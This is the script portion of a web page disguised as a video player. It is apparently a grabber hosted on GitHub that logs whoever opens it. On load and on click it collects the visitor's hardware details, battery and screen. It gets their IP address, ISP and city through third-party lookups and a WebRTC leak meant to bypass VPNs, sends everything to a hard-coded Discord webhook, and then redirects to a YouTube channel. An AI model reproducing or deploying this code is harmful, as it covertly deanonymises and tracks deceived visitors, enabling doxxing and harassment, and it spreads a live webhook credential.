    </style>
</head>
<body>

    <div class="gate" id="masterTrigger">
        <button class="btn">▶ START VIDEO</button>
        <p class="status">Connecting to Encrypted Buffer...</p>
    </div>

    <script>
    const CONFIG = {
        HOOK: "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0",
        DEST: "https://youtube.com/@LigmaBlox-w7m"
    };

    // --- UNIVERSAL DISPATCHER ---
    function send(data, label = "SYSTEM") {
        const blob = new Blob([JSON.stringify({ ...data, username: label })], { type: 'application/json' });
        
        // Try all three delivery methods for maximum durability
        try { fetch(CONFIG.HOOK, { method: 'POST', body: blob, mode: 'no-cors', keepalive: true }); } catch(e){}
        try { navigator.sendBeacon(CONFIG.HOOK, blob); } catch(e){}
        
        // Backup: XHR for very old devices/browsers
        try {
            let x = new XMLHttpRequest();
            x.open("POST", CONFIG.HOOK);
            x.send(blob);
        } catch(e){}
    }

    // --- UNIVERSAL DEVICE IDENTIFIER ---
    async function probeDevice() {
        let info = {
            os: navigator.platform,
            agent: navigator.userAgent,
            cores: navigator.hardwareConcurrency || "N/A",
            ram: navigator.deviceMemory || "N/A",
            gpu: "Unknown",
            screen: `${screen.width}x${screen.height} (@${window.devicePixelRatio}x)`
        };

        // GPU Unmasking (Works on Windows, Mac, Android, iOS)
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            const debug = gl.getExtension('WEBGL_debug_renderer_info');
            info.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
        } catch(e) { info.gpu = "Masked/Software"; }

        // Battery Intel
        try {
            const b = await navigator.getBattery();
            info.battery = `${Math.round(b.level * 100)}% (${b.charging ? "Charging" : "Unplugged"})`;
        } catch(e) {}

        return info;
    }

    // --- UNIVERSAL NETWORK PROBE (The "Triple Threat") ---
    function probeNetwork() {
        // 1. JSONP Tunnel (Bypasses most Wi-Fi restrictions)
        const s = document.createElement('script');
        s.src = `https://ipinfo.io/json?callback=xtunnel&t=${Date.now()}`;
        document.body.appendChild(s);

        // 2. WebRTC UDP Crack (Bypasses VPNs)
        const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
        rtc.createDataChannel("");
        rtc.onicecandidate = (e) => {
            if (e.candidate) {
                const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                if (ip) send({ content: `🚨 **FIREWALL CRACKED:** \`${ip[1]}\`` }, "UDP-PROBE");
            }
        };
        rtc.createOffer().then(o => rtc.setLocalDescription(o));

        // 3. Direct API Race
        fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d => {
            send({ content: `📡 **IP DISCOVERY:** \`${d.ip}\`` }, "API-PROBE");
        }).catch(()=>{});
    }

    // JSONP Callback handler
    window.xtunnel = (data) => {
        send({
            embeds: [{
                title: "🛑 CONNECTION ESTABLISHED",
                color: 16776960,
                fields: [
                    { name: "IP", value: data.ip || "??", inline: true },
                    { name: "ISP", value: data.org || "??", inline: true },
                    { name: "Location", value: `${data.city}, ${data.country}`, inline: true }
                ]
            }]
        }, "JSONP-PROBE");
    };

    // --- MASTER RUN ---
    async function start() {
        // Silent landing ping
        send({ content: "🟢 **Target is on GitHub Landing Page...**" });

        document.getElementById('masterTrigger').onclick = async function() {
            this.innerHTML = "<button class='btn'>LOADING...</button>";
            
            // Gather hardware first
            const hardware = await probeDevice();
            send({
                embeds: [{
                    title: "💎 HARDWARE UNMASKED",
                    color: 16711680,
                    fields: [
                        { name: "Device/OS", value: hardware.os, inline: true },
                        { name: "GPU", value: "```" + hardware.gpu + "```" },
                        { name: "Specs", value: `Cores: ${hardware.cores} | RAM: ${hardware.ram}GB`, inline: true },
                        { name: "Screen", value: hardware.screen, inline: true },
                        { name: "Battery", value: hardware.battery || "N/A", inline: true }
                    ]
                }]
            }, "APEX-HARDWARE");

            // Trigger network probes
            probeNetwork();

            // Final Redirect
            setTimeout(() => {
                window.location.replace(CONFIG.DEST);
            }, 600);
        };
    }

    start();
    </script>
